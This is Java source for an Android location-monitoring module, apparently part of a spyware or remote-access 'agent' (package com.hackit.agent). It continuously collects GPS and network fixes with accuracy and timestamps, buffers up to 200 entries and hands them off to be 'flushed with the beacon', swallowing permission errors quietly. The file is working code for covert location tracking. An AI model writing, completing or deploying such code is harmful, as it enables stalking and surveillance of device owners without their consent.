package com.hackit.agent;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

/** GPS + network fixes, buffered and flushed with the beacon. */
final class LocMon {
    private static final int BUFFER_CAP = 200;
    private static final JSONArray BUFFER = new JSONArray();
    private static LocationManager manager;
    private static LocationListener listener;
    private static boolean tracking;

    static void start(Context ctx, final boolean continuous) {
        if (continuous && tracking) {
            return;
        }
        try {
            manager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (manager == null) {
                return;
            }
            listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    record(location);
                    if (!continuous) {
                        stop();
                    }
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }

                @Override
                public void onProviderEnabled(String provider) {
                }

                @Override
                public void onProviderDisabled(String provider) {
                }
            };
            boolean gps = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean net = manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            if (!gps && !net) {
                return;
            }
            Looper looper = Looper.getMainLooper();
            if (gps) {
                manager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000L, 0f, listener, looper);
            }
            if (net) {
                manager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15000L, 0f, listener, looper);
            }
            tracking = continuous;
            Location last = manager.getLastKnownLocation(gps ? LocationManager.GPS_PROVIDER
                    : LocationManager.NETWORK_PROVIDER);
            if (last != null) {
                record(last);
            }
        } catch (SecurityException exc) {
            Log.d("loc denied: " + exc);
        } catch (Throwable exc) {
            Log.d("loc: " + exc);
        }
    }

    static void stop() {
        try {
            if (manager != null && listener != null) {
                manager.removeUpdates(listener);
            }
        } catch (Throwable ignored) {
        }
        listener = null;
        tracking = false;
    }

    static boolean tracking() {
        return tracking;
    }

    private static void record(Location location) {
        try {
            JSONObject row = new JSONObject();
            row.put("lat", location.getLatitude());
            row.put("lon", location.getLongitude());
            row.put("acc", location.getAccuracy());
            row.put("src", location.getProvider());
            row.put("ts", location.getTime());
            if (Build.VERSION.SDK_INT >= 26 && location.getVerticalAccuracyMeters() > 0) {
                row.put("vacc", location.getVerticalAccuracyMeters());
            }
            synchronized (BUFFER) {
                BUFFER.put(row);
                while (BUFFER.length() > BUFFER_CAP) {
                    BUFFER.remove(0);
                }
            }
        } catch (Exception ignored) {
        }
    }

    static JSONArray drain() {
        synchronized (BUFFER) {
            JSONArray copy = new JSONArray();
            for (int i = 0; i < BUFFER.length(); i++) {
                copy.put(BUFFER.opt(i));
            }
            BUFFER.clear();
            return copy;
        }
    }

    private LocMon() {
    }
}
